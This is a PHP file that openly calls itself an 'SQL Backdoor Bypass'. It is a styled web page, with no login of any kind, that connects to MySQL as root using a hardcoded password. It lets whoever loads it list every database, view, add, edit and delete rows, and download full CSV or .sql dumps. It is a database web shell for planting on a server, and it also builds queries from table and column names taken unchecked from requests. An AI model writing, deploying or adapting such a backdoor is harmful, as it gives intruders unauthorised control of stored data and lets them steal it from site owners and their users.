<?php
/**
 * Mini MySQL CRUD – Black & Red "Backdoor" Theme
 * - Title center: "Backdoor Bypass by AAAA"
 * - Scrolling banner: "🔥 This backdoor made with love and some magics 🔥"
 * - CRUD (View/Add/Edit/Delete), pagination rows(100) & cols(100)
 * - Export CSV (tabel aktif), Export DB (.sql)
 * - PDO + CSRF + prepared statements
 */

declare(strict_types=1);
session_start();
header_remove("X-Powered-By");

// ========================= CONFIG =========================
const DB_HOST   = 'localhost';
const DB_PORT   = 3306;
const DB_SOCKET = '/var/lib/mysql/mysql.sock'; // kosongkan '' jika tidak pakai socket
const DB_USER   = 'root';
const DB_PASS   = 'Digital134';
const DEFAULT_DB = ''; // boleh isi nama DB default

const ROWS_PER_PAGE = 100;
const COLS_PER_PAGE = 100;

const MAX_TEXTAREA_CHARS = 2000;
// ==========================================================

// CSRF
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(16));
}
function csrf_check(): void {
    if (($_POST['csrf'] ?? '') !== ($_SESSION['csrf'] ?? '')) {
        http_response_code(403);
        exit('Invalid CSRF token');
    }
}
function e(string $s): string { return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }

// Koneksi PDO
function pdo(string $db = ''): PDO {
    $useSocket = DB_SOCKET !== '' && @is_readable(DB_SOCKET);
    if ($useSocket) {
        $dsn = 'mysql:unix_socket='.DB_SOCKET.';charset=utf8mb4';
        if ($db !== '') $dsn .= ';dbname='.$db;
    } else {
        $dsn = 'mysql:host='.DB_HOST.';port='.DB_PORT.';charset=utf8mb4';
        if ($db !== '') $dsn .= ';dbname='.$db;
    }
    return new PDO($dsn, DB_USER, DB_PASS, [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES   => false,
    ]);
}

// URL helper
function url(array $q = []): string {
    $base = strtok($_SERVER['REQUEST_URI'],'?');
    $merged = array_filter(array_merge($_GET, $q), fn($v) => $v !== null);
    return $base.(empty($merged)?'':'?'.http_build_query($merged));
}

// Params
$db    = $_GET['db']    ?? (DEFAULT_DB ?: '');
$table = $_GET['table'] ?? '';
$action= $_GET['action']?? 'browse';
$page  = max(1, (int)($_GET['page'] ?? 1));
$colpg = max(1, (int)($_GET['colpg'] ?? 1));

// List db & table
function list_databases(): array {
    $pdo = pdo();
    $rows = $pdo->query("SHOW DATABASES")->fetchAll(PDO::FETCH_COLUMN);
    return array_values(array_filter($rows, fn($d)=>!in_array($d, ['information_schema','performance_schema','mysql','sys'], true)));
}
function list_tables(string $db): array {
    $pdo = pdo($db);
    return $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
}

// Schema helpers
function get_columns(string $db, string $table): array {
    $pdo = pdo($db);
    $stmt = $pdo->prepare("SELECT COLUMN_NAME, DATA_TYPE, COLUMN_KEY, IS_NULLABLE, COLUMN_DEFAULT, EXTRA
                           FROM INFORMATION_SCHEMA.COLUMNS
                           WHERE TABLE_SCHEMA = ? AND TABLE_NAME = ?
                           ORDER BY ORDINAL_POSITION");
    $stmt->execute([$db,$table]);
    return $stmt->fetchAll();
}
function get_primary_keys(string $db, string $table): array {
    $pdo = pdo($db);
    $stmt = $pdo->prepare("SELECT COLUMN_NAME
        FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE
        WHERE TABLE_SCHEMA=? AND TABLE_NAME=? AND CONSTRAINT_NAME='PRIMARY'
        ORDER BY ORDINAL_POSITION");
    $stmt->execute([$db,$table]);
    return array_map(fn($r)=>$r['COLUMN_NAME'], $stmt->fetchAll());
}
function build_pk_where(array $pkCols, array $row): array {
    $where = []; $vals  = [];
    foreach ($pkCols as $c) { $where[] = "`$c` = ?"; $vals[] = $row[$c] ?? null; }
    return [implode(' AND ', $where), $vals];
}

// Data ops
function fetch_rows(string $db, string $table, int $page, int $limit): array {
    $pdo = pdo($db);
    $offset = ($page-1)*$limit;
    $sql = "SELECT SQL_CALC_FOUND_ROWS * FROM `$table` LIMIT :lim OFFSET :off";
    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(':lim', $limit, PDO::PARAM_INT);
    $stmt->bindValue(':off', $offset, PDO::PARAM_INT);
    $stmt->execute();
    $data = $stmt->fetchAll();
    $total = (int)$pdo->query("SELECT FOUND_ROWS()")->fetchColumn();
    return [$data, $total];
}
function insert_row(string $db, string $table, array $payload): void {
    $pdo = pdo($db);
    if (!$payload) return;
    $cols = array_keys($payload);
    $place = implode(',', array_fill(0,count($cols),'?'));
    $sql = "INSERT INTO `$table` (`".implode('`,`',$cols)."`) VALUES ($place)";
    $pdo->prepare($sql)->execute(array_values($payload));
}
function update_row(string $db, string $table, array $payload, array $pkCols, array $pkValsFromHidden): void {
    $pdo = pdo($db);
    if (!$payload) return;
    $sets = []; $vals = [];
    foreach ($payload as $k=>$v) { $sets[] = "`$k`=?"; $vals[]=$v; }
    [$where,$wvals] = build_pk_where($pkCols, $pkValsFromHidden);
    $sql = "UPDATE `$table` SET ".implode(',', $sets)." WHERE $where";
    $pdo->prepare($sql)->execute([...$vals, ...$wvals]);
}
function delete_row(string $db, string $table, array $pkCols, array $pkVals): void {
    $pdo = pdo($db);
    [$where,$vals] = build_pk_where($pkCols, $pkVals);
    $sql = "DELETE FROM `$table` WHERE $where";
    $pdo->prepare($sql)->execute($vals);
}

// Export CSV (tabel aktif)
function export_csv(string $db, string $table): void {
    $pdo = pdo($db);
    header("Content-Type: text/csv; charset=UTF-8");
    header('Content-Disposition: attachment; filename="'.rawurlencode($table).'.csv"');
    $out = fopen('php://output','w');
    $stmt = $pdo->query("SELECT * FROM `$table`");
    $first = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($first !== false) {
        fputcsv($out, array_keys($first));
        fputcsv($out, array_map(fn($v)=>is_string($v)?$v:(string)$v, $first));
    } else {
        fputcsv($out, []);
    }
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        fputcsv($out, array_map(fn($v)=>is_string($v)?$v:(string)$v, $row));
    }
    fclose($out);
    exit;
}

// Export DB .sql
function export_database_sql(string $db): void {
    $pdo = pdo($db);
    $tables = list_tables($db);

    header('Content-Type: application/sql; charset=UTF-8');
    header('Content-Disposition: attachment; filename="'.rawurlencode($db).'_dump_'.date('Ymd_His').'.sql"');

    $out = fopen('php://output', 'w');
    $w = fn(string $s)=>fwrite($out, $s);

    $w("-- Dump for `$db` • ".date('c')."\n");
    $w("SET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS=0;\nSET SQL_MODE='NO_AUTO_VALUE_ON_ZERO';\n\n");

    foreach ($tables as $t) {
        $w("--\n-- Structure for `$t`\n--\n");
        $w("DROP TABLE IF EXISTS `$t`;\n");
        $row = $pdo->query("SHOW CREATE TABLE `$t`")->fetch(PDO::FETCH_ASSOC);
        $create = $row ? ($row['Create Table'] ?? array_values($row)[1]) : '';
        $w($create.";\n\n");

        $w("--\n-- Data for `$t`\n--\n");
        $stmt = $pdo->query("SELECT * FROM `$t`");
        $cols = [];
        $first = $pdo->query("SHOW COLUMNS FROM `$t`")->fetchAll(PDO::FETCH_ASSOC);
        foreach ($first as $c) { $cols[] = $c['Field']; }
        if (!$cols) { $w("\n"); continue; }

        $batchSize = 500;
        $buffer = [];
        $quotedCols = '`'.implode('`,`',$cols).'`';

        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $vals = [];
            foreach ($cols as $c) {
                $v = $row[$c];
                if (is_null($v)) {
                    $vals[] = 'NULL';
                } elseif (is_numeric($v) && !preg_match('/^0\d+$/', (string)$v)) {
                    $vals[] = (string)$v;
                } else {
                    $vals[] = "'".str_replace(
                        ["\\","'","\0","\n","\r","\x1a"],
                        ["\\\\","\\'","\\0","\\n","\\r","\\Z"],
                        (string)$v
                    )."'";
                }
            }
            $buffer[] = '('.implode(',', $vals).')';
            if (count($buffer) >= $batchSize) {
                $w("INSERT INTO `$t` ($quotedCols) VALUES \n".implode(",\n", $buffer).";\n");
                $buffer = [];
                if (function_exists('flush')) { @flush(); }
            }
        }
        if ($buffer) {
            $w("INSERT INTO `$t` ($quotedCols) VALUES \n".implode(",\n", $buffer).";\n");
            $buffer = [];
        }
        $w("\n");
    }
    $w("SET FOREIGN_KEY_CHECKS=1;\n");
    fclose($out);
    exit;
}

// Actions (POST)
if ($_SERVER['REQUEST_METHOD']==='POST') {
    csrf_check();
    $act = $_POST['do'] ?? '';
    $dbP = $_POST['db'] ?? '';
    $tbP = $_POST['table'] ?? '';
    if ($act==='insert') {
        $payload=[]; foreach (($_POST['col'] ?? []) as $k=>$v) { $payload[$k] = ($v === '') ? null : $v; }
        insert_row($dbP,$tbP,$payload);
        header("Location: ".url(['db'=>$dbP,'table'=>$tbP,'action'=>'browse'])); exit;
    } elseif ($act==='update') {
        $payload=[]; foreach (($_POST['col'] ?? []) as $k=>$v) { $payload[$k] = ($v === '') ? null : $v; }
        $pkCols = get_primary_keys($dbP,$tbP);
        if (!$pkCols) { $schema = get_columns($dbP,$tbP); $pkCols = [$schema[0]['COLUMN_NAME'] ?? 'id']; }
        $pkHidden=[]; foreach ($pkCols as $c) { $pkHidden[$c] = $_POST['pk'][$c] ?? null; }
        update_row($dbP,$tbP,$payload,$pkCols,$pkHidden);
        header("Location: ".url(['db'=>$dbP,'table'=>$tbP,'action'=>'browse'])); exit;
    } elseif ($act==='delete') {
        $pkCols = get_primary_keys($dbP,$tbP);
        if (!$pkCols) { $schema = get_columns($dbP,$tbP); $pkCols = [$schema[0]['COLUMN_NAME'] ?? 'id']; }
        $pkVals=[]; foreach ($pkCols as $c) { $pkVals[$c] = $_POST['pk'][$c] ?? null; }
        delete_row($dbP,$tbP,$pkCols,$pkVals);
        header("Location: ".url(['db'=>$dbP,'table'=>$tbP,'action'=>'browse'])); exit;
    }
}

// Triggers
if (($action==='export') && $db && $table) { export_csv($db,$table); }
if (($action==='export_db') && $db) { export_database_sql($db); }

// ============================ UI ============================
function header_html(string $title='SQL Backdoor Bypass by S-DACOSTA'): void {
    echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">';
    echo '<title>'.e($title).'</title>';
    echo '<style>
    :root{
      --bg:#0b0b0d; --bg2:#0a0a0c;
      --panel:#111113; --edge:#1f1f22;
      --ink:#f4f4f5; --muted:#b7b7b9;
      --red:#ff003c; --red2:#ff4d6d; --red3:#ff1a53;
      --ok:#16d196; --warn:#ffc043
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      background:
        radial-gradient(1200px 600px at -10% -10%, rgba(255,0,60,.08), transparent 60%),
        radial-gradient(1000px 500px at 110% 10%, rgba(255,77,109,.06), transparent 55%),
        linear-gradient(180deg, var(--bg), var(--bg2) 60%, #09090b);
      color:var(--ink);
      font:14px/1.65 ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
      letter-spacing:.2px
    }
    .wrap{max-width:1280px;margin:24px auto;padding:0 16px}
    .banner{
      position:sticky;top:0;z-index:10;overflow:hidden;height:34px;
      background:#120d10;border-bottom:1px solid #2a1620;
      box-shadow:0 4px 18px rgba(255,0,60,.15) inset, 0 2px 12px rgba(0,0,0,.35)
    }
    .marquee{
      white-space:nowrap;display:inline-block;padding:6px 0;
      animation:scroll 18s linear infinite;color:#ffd0da;text-shadow:0 0 8px rgba(255,0,60,.45);
      font-weight:600
    }
    @keyframes scroll{0%{transform:translateX(110%)}100%{transform:translateX(-110%)}}
    .title{
      margin:16px 0 8px;text-align:center;
      font-size:24px;font-weight:900;letter-spacing:1px;
      background:linear-gradient(90deg,var(--red),var(--red2));-webkit-background-clip:text;background-clip:text;color:transparent;
      text-shadow:0 0 18px rgba(255,0,60,.25)
    }
    .card{
      background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01));
      border:1px solid #211118;border-radius:18px;padding:16px;position:relative;overflow:hidden
    }
    .card:before{
      content:"";position:absolute;inset:-2px;z-index:0;
      background:conic-gradient(from 180deg at 50% 50%,rgba(255,0,60,.18),rgba(255,77,109,.10),transparent 20%);
      filter:blur(22px);opacity:.35;pointer-events:none
    }
    .content{position:relative;z-index:1}
    a{color:var(--red2);text-decoration:none}
    a:hover{color:#ff6f8a}
    .row{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
    .grid{display:grid;gap:10px}
    .grow{flex:1 1 auto}
    select,input,textarea{
      background:#0e0a0c;color:var(--ink);border:1px solid #2a1a22;border-radius:12px;padding:9px 10px;
      outline:none;transition:border-color .2s, box-shadow .2s
    }
    select:focus,input:focus,textarea:focus{border-color:#7a1f32;box-shadow:0 0 0 3px rgba(255,0,60,.15)}
    .btn{
      border:1px solid #3a1a22;background:#140a0d;color:#ffdfe6;border-radius:12px;padding:9px 14px;
      cursor:pointer;transition:transform .08s ease, box-shadow .2s, border-color .2s
    }
    .btn:hover{box-shadow:0 0 18px rgba(255,0,60,.22)}
    .btn:active{transform:translateY(1px)}
    .btn.primary{border-color:#7a1427;background:#19070b}
    .btn.danger{border-color:#aa1f34;background:#1d0b10}
    .btn.warn{border-color:#5a3a1f;background:#18100b;color:#ffe6c4}
    .badge{display:inline-block;padding:2px 8px;border-radius:999px;background:#140a0d;border:1px solid #2a1a22;color:#ffb3c2}
    .pk{color:var(--ok);font-weight:700}
    .muted{color:var(--muted)}
    table{width:100%;border-collapse:separate;border-spacing:0;overflow:auto}
    th,td{padding:8px;border-bottom:1px solid #2a171f;vertical-align:top;max-width:520px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    th{position:sticky;top:0;background:#120a0d;border-bottom:1px solid #3a1b23;color:#ffc8d1}
    .pagination{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
    .hr{height:1px;background:linear-gradient(90deg,transparent,#2a1620,transparent);margin:12px 0}
    </style></head><body>';
    echo '<div class="banner"><div class="marquee">🔥 This backdoor made with love and some black magics 🔥</div></div>';
    echo '<div class="wrap"><h1 class="title">SQL Backdoor Bypass by S-DACOSTA</h1>';
}
function footer_html(): void { echo '</div></body></html>'; }

// ====== RENDER ======
header_html();

echo '<div class="card"><div class="content">';
echo '<form method="get" class="row" style="gap:10px">';
echo '<span class="badge">PHP 8.3 • PDO</span>';
echo '<label>Database: <select name="db" onchange="this.form.submit()"><option value="">-- pilih DB --</option>';
foreach (list_databases() as $d) {
    $sel = $d===$db ? 'selected':'';
    echo '<option '.$sel.' value="'.e($d).'">'.e($d).'</option>';
}
echo '</select></label>';

if ($db) {
    echo '<label>Tabel: <select name="table" onchange="this.form.submit()"><option value="">-- pilih tabel --</option>';
    foreach (list_tables($db) as $t) {
        $sel = $t===$table ? 'selected':'';
        echo '<option '.$sel.' value="'.e($t).'">'.e($t).'</option>';
    }
    echo '</select></label>';
}
echo '<input type="hidden" name="action" value="browse">';
echo '<noscript><button class="btn">Go</button></noscript>';
echo '</form>';

echo '<div class="hr"></div>';
echo '<div class="row">';
if ($db && $table) {
    echo '<a class="btn" href="'.e(url(['action'=>'browse','page'=>1])).'">Browse</a>';
    echo '<a class="btn primary" href="'.e(url(['action'=>'add'])).'">Add</a>';
    echo '<a class="btn warn" href="'.e(url(['action'=>'export'])).'">Export CSV (Table)</a>';
}
if ($db) {
    echo '<a class="btn primary" href="'.e(url(['action'=>'export_db','table'=>null])).'">Export DB (.sql)</a>';
}
echo '</div>';
echo '</div></div>';

// Guard
if (!$db) {
    echo '<div style="height:12px"></div><div class="card"><div class="content"><div class="muted">Pilih database untuk mulai.</div></div></div>';
    footer_html(); exit;
}
if (!$table) {
    echo '<div style="height:12px"></div><div class="card"><div class="content"><div class="muted">Pilih tabel untuk CRUD, atau gunakan <b>Export DB (.sql)</b> untuk seluruh database.</div></div></div>';
    footer_html(); exit;
}

// Schema & pagination kolom
$cols = get_columns($db,$table);
$pkCols = get_primary_keys($db,$table);
$pkSet = array_flip($pkCols);
$chunks = array_chunk($cols, COLS_PER_PAGE);
$totalColPages = max(1, count($chunks));
$colpg = min($colpg, $totalColPages);
$visibleCols = $chunks[$colpg-1];

// Nav kolom
if ($totalColPages > 1) {
    echo '<div style="height:12px"></div><div class="card"><div class="content"><div class="pagination">';
    echo '<span class="muted">Kolom:</span>';
    for ($i=1; $i<=$totalColPages; $i++) {
        $u = url(['colpg'=>$i]);
        echo $i===$colpg ? '<span class="badge">Hal '.$i.'</span> ' : '<a class="btn" href="'.e($u).'">Hal '.$i.'</a> ';
    }
    echo '</div></div></div>';
}

if ($action==='browse') {
    [$rows, $total] = fetch_rows($db,$table,$page,ROWS_PER_PAGE);
    $totalPages = max(1, (int)ceil($total/ROWS_PER_PAGE));

    echo '<div style="height:12px"></div><div class="card"><div class="content">';
    echo '<div class="row" style="justify-content:space-between;align-items:center">';
    echo '<div><b>'.e($db).'</b>.<b>'.e($table).'</b> ';
    echo '<span class="muted">Total rows: '.number_format($total).' • Kolom: '.count($cols).'</span></div>';
    echo '<div class="pagination">';
    if ($page>1) echo '<a class="btn" href="'.e(url(['page'=>1])).'">« First</a><a class="btn" href="'.e(url(['page'=>$page-1])).'">‹ Prev</a>';
    echo '<span class="badge">Page '.$page.' / '.$totalPages.'</span>';
    if ($page<$totalPages) echo '<a class="btn" href="'.e(url(['page'=>$page+1])).'">Next ›</a><a class="btn" href="'.e(url(['page'=>$totalPages])).'">Last »</a>';
    echo '</div></div><div class="hr"></div>';

    echo '<div style="overflow:auto"><table>';
    echo '<thead><tr>';
    foreach ($visibleCols as $c) {
        $isPk = isset($pkSet[$c['COLUMN_NAME']]);
        echo '<th>'.e($c['COLUMN_NAME']).($isPk?' <span class="pk">PK</span>':'').'</th>';
    }
    echo '<th>Actions</th></tr></thead><tbody>';

    foreach ($rows as $r) {
        echo '<tr>';
        foreach ($visibleCols as $c) {
            $name = $c['COLUMN_NAME']; $val = $r[$name] ?? null;
            $disp = is_null($val) ? '<span class="muted">NULL</span>' : e(mb_strimwidth((string)$val, 0, 300, '…'));
            echo '<td title="'.e((string)$val).'">'.$disp.'</td>';
        }
        $pkQuery = [];
        foreach ($pkCols as $p) { $pkQuery['pk['.$p.']'] = (string)($r[$p] ?? ''); }
        $editUrl = url(['action'=>'edit'] + $pkQuery);
        echo '<td>';
        echo '<a class="btn" href="'.e($editUrl).'">Edit</a> ';
        echo '<form method="post" style="display:inline" onsubmit="return confirm(\'Delete this row?\')">';
        echo '<input type="hidden" name="csrf" value="'.e($_SESSION['csrf']).'">';
        echo '<input type="hidden" name="db" value="'.e($db).'">';
        echo '<input type="hidden" name="table" value="'.e($table).'">';
        foreach ($pkCols as $p) {
            echo '<input type="hidden" name="pk['.e($p).']" value="'.e((string)($r[$p] ?? '')).'">';
        }
        echo '<button class="btn danger" name="do" value="delete">Delete</button></form>';
        echo '</td></tr>';
    }
    if (!$rows) echo '<tr><td class="muted" colspan="'.(count($visibleCols)+1).'">Tidak ada data.</td></tr>';
    echo '</tbody></table></div></div></div>';

} elseif ($action==='add') {
    echo '<div style="height:12px"></div><div class="card"><div class="content">';
    echo '<h3 class="title" style="font-size:18px;margin:0 0 6px">Add Row</h3><div class="hr"></div>';
    echo '<form method="post" class="grid" style="gap:10px">';
    echo '<input type="hidden" name="csrf" value="'.e($_SESSION['csrf']).'">';
    echo '<input type="hidden" name="db" value="'.e($db).'">';
    echo '<input type="hidden" name="table" value="'.e($table).'">';
    echo '<input type="hidden" name="do" value="insert">';
    foreach ($visibleCols as $c) {
        $name = $c['COLUMN_NAME']; $type = strtolower($c['DATA_TYPE']);
        $isText = str_contains($type,'text') || str_contains($type,'blob');
        echo '<label><div class="muted">'.e($name).' <span class="badge">'.e($type).'</span>'.($c['COLUMN_KEY']==='PRI'?' <span class="pk">PK</span>':'').'</div>';
        if ($isText) echo '<textarea name="col['.e($name).']" rows="3" maxlength="'.MAX_TEXTAREA_CHARS.'"></textarea>';
        else echo '<input type="text" name="col['.e($name).']" />';
        echo '</label>';
    }
    echo '<div class="row"><button class="btn primary">Insert</button> <a class="btn" href="'.e(url(['action'=>'browse'])).'">Cancel</a></div>';
    echo '</form></div></div>';

} elseif ($action==='edit') {
    if (!$pkCols) $pkCols = [$cols[0]['COLUMN_NAME'] ?? 'id'];
    $where=[]; $vals=[];
    foreach ($pkCols as $p) { $where[]="`$p`=?"; $vals[] = $_GET['pk'][$p] ?? ''; }
    $pdo = pdo($db);
    $stmt = $pdo->prepare("SELECT * FROM `$table` WHERE ".implode(' AND ',$where)." LIMIT 1");
    $stmt->execute($vals);
    $row = $stmt->fetch();
    echo '<div style="height:12px"></div><div class="card"><div class="content">';
    if (!$row) {
        echo '<div class="muted">Row tidak ditemukan.</div>';
    } else {
        echo '<h3 class="title" style="font-size:18px;margin:0 0 6px">Edit Row</h3><div class="hr"></div>';
        echo '<form method="post" class="grid" style="gap:10px">';
        echo '<input type="hidden" name="csrf" value="'.e($_SESSION['csrf']).'">';
        echo '<input type="hidden" name="db" value="'.e($db).'">';
        echo '<input type="hidden" name="table" value="'.e($table).'">';
        echo '<input type="hidden" name="do" value="update">';
        foreach ($pkCols as $p) echo '<input type="hidden" name="pk['.e($p).']" value="'.e((string)($row[$p] ?? '')).'">';

        foreach ($visibleCols as $c) {
            $name = $c['COLUMN_NAME']; $type = strtolower($c['DATA_TYPE']);
            $isText = str_contains($type,'text') || str_contains($type,'blob');
            $val  = $row[$name] ?? null;
            echo '<label><div class="muted">'.e($name).' <span class="badge">'.e($type).'</span>'.(isset($pkSet[$name])?' <span class="pk">PK</span>':'').'</div>';
            if ($isText) echo '<textarea name="col['.e($name).']" rows="4">'.e(mb_substr((string)$val,0,MAX_TEXTAREA_CHARS)).'</textarea>';
            else echo '<input type="text" name="col['.e($name).']" value="'.e((string)$val).'" />';
            echo '</label>';
        }
        echo '<div class="row"><button class="btn primary">Save</button> <a class="btn" href="'.e(url(['action'=>'browse'])).'">Cancel</a></div>';
        echo '</form>';
    }
    echo '</div></div>';
}

footer_html();
